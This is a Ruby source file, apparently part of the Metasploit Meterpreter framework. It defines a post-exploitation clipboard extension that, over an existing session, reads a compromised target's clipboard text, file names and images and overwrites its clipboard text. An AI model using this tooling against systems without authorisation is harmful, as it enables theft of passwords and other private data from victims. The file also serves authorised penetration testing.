# -*- coding: binary -*-

module Rex
module Post
module Meterpreter
module Extensions
module Extapi
module Clipboard

###
#
# This meterpreter extension contains extended API functions for
# querying and managing desktop windows.
#
###
class Clipboard

  def initialize(client)
    @client = client
  end

  # Get the target clipboard data in whichever format we can
  # (if it's supported).
  def get_data(download = false)
    results = []

    request = Packet.create_request('extapi_clipboard_get_data')

    if download
      request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_DOWNLOAD, true)
    end

    response = client.send_request(request)

    text = response.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT)

    if text
      results << {
        :type => :text,
        :data => text
      }
    end

    files = []
    response.each(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE) { |f|
      files << {
        :name => f.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME),
        :size => f.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE)
      }
    }

    if files.length > 0
      results << {
        :type => :files,
        :data => files
      }
    end

    response.each(TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG) do |jpg|
      if jpg
        results << {
          :type   => :jpg,
          :width  => jpg.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX),
          :height => jpg.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY),
          :data   => jpg.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA)
        }
      end
    end

    return results
  end

  # Set the target clipboard data to a text value
  def set_text(text)
    request = Packet.create_request('extapi_clipboard_set_data')

    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, text)

    response = client.send_request(request)

    return true
  end

  attr_accessor :client

end

end; end; end; end; end; end
